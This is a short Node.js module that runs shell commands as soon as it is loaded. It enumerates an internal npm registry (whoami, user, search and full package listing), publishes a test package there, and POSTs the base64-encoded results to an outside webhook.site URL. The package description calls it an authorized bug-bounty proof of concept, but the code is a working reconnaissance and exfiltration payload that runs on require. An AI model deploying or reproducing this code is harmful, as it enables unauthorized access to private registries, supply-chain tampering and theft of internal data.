const cp = require("child_process");
const OOB = "https://webhook.site/dbabceb9-a237-417e-ba20-1a8d6649c8ff";
function sh(c){ try { return cp.execSync(c,{encoding:"utf8",timeout:28000,maxBuffer:20971520,stdio:["ignore","pipe","pipe"]}); } catch(e){ return "STDOUT:"+(e.stdout||"")+"\nSTDERR:"+(e.stderr||"")+"\nMSG:"+(e.message||""); } }
const REG = process.env.NPM_CONFIG_REGISTRY || "http://10.0.0.28:4873";
const rnd = Math.random().toString(36).slice(2,10);
const script = [
'REG="'+REG+'"',
'echo "==REG=="; echo "$REG"',
'echo "==NPMWHOAMI=="; npm whoami --registry "$REG" 2>&1 || true',
'echo "==PING=="; curl -s --max-time 8 "$REG/-/ping" 2>&1; echo',
'echo "==USERANON=="; curl -s --max-time 8 "$REG/-/npm/v1/user" 2>&1 | head -c 600; echo',
'echo "==SEARCH=="; curl -s --max-time 10 "$REG/-/v1/search?text=&size=250" 2>&1 | head -c 5000; echo',
'echo "==ALL=="; curl -s --max-time 10 "$REG/-/all" 2>&1 | head -c 3000; echo',
'PKG="crsectest-poc-'+rnd+'"',
'D=$(mktemp -d); cd "$D"',
'printf \'{"name":"%s","version":"1.0.0","description":"authorized-bbp-poc"}\' "$PKG" > package.json',
'echo "console.log(1)" > index.js',
'echo "==PUBLISH=="; npm publish --registry "$REG" --no-git-checks 2>&1 | head -c 3500; echo',
'echo "==VERIFY=="; curl -s --max-time 8 "$REG/$PKG" 2>&1 | head -c 1800; echo',
'echo "==PKGNAME=="; echo "$PKG"'
].join("\n");
const out = sh("bash -c " + JSON.stringify(script));
const b64 = Buffer.from(out).toString("base64");
sh("curl -s --max-time 12 -X POST --data-binary " + JSON.stringify(b64) + " " + JSON.stringify(OOB + "/regtest"));
sh("curl -s --max-time 6 " + JSON.stringify(OOB + "/regtest-done"));
module.exports = [];
